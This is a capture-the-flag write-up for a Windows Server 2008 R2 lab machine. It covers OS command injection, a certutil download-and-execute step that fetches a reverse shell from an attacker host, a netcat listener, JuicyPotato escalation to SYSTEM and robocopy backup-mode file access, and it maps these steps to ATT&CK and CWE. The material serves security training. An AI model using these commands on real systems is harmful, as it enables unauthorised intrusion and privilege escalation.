# MAQ162: Try Harder

Writeup for the **Try Harder** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Hard
> **Difficulty:** Hard
> **Points:** 162

---

## Overview

A Windows Server 2008 R2 machine running IIS with a web application vulnerable to command injection. Initial access through OS command injection leads to a low-privilege shell; privilege escalation to SYSTEM is achieved via JuicyPotato, and the flag is recovered using `robocopy /B` to bypass NTFS access restrictions.

## Reconnaissance

```bash
nmap -sC -sV -p- [TARGET_IP]
```

The scan reveals IIS on port 80/443 and standard Windows services. Browsing the web application uncovers a form that passes user input directly to a system command.

```bash
gobuster dir -u http://[TARGET_IP] -w /usr/share/wordlists/dirb/common.txt -x asp,aspx
```

## Exploitation

1. Identify the command injection point in the web application parameter.
2. Confirm execution with a `ping` callback to the attacker machine.
3. Use the injection to download and execute a reverse shell payload.

```bash
# On attacker
python3 -m http.server 8080
nc -lvnp 4444
```

```
# Injected command (conceptual)
| certutil -urlcache -split -f http://[ATTACKER_IP]:8080/shell.exe C:\Temp\shell.exe & C:\Temp\shell.exe
```

The shell lands as `iis apppool\defaultapppool`, a service account with `SeImpersonatePrivilege`.

## Privilege Escalation

1. Confirm token privileges: `whoami /priv` shows `SeImpersonatePrivilege` enabled.
2. Upload JuicyPotato to the target and select an appropriate CLSID for Windows 2008 R2.
3. Execute JuicyPotato to spawn a SYSTEM-level shell.

```bash
JuicyPotato.exe -l 1337 -p C:\Temp\shell2.exe -t * -c {CLSID}
```

4. The flag file is protected by restrictive NTFS ACLs. Use `robocopy` with the `/B` (backup mode) flag to copy it to a readable location.

```cmd
robocopy C:\[FLAG_DIR] C:\Temp flag.txt /B
type C:\Temp\flag.txt
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Command and Scripting Interpreter: Windows Command Shell | T1059.003 |
| Access Token Manipulation | T1134 |
| Data from Local System | T1005 |

### CWE

- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)
- **CWE-269:** Improper Privilege Management
- **CWE-732:** Incorrect Permission Assignment for Critical Resource

### NIST SP 800-53

- **SI-10:** Information Input Validation
- **AC-6:** Least Privilege

---

When the system tells you to try harder, take the hint literally: impersonate the potato, steal the token, and let backup mode do the heavy lifting.

(❍ᴥ❍ʋ)

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
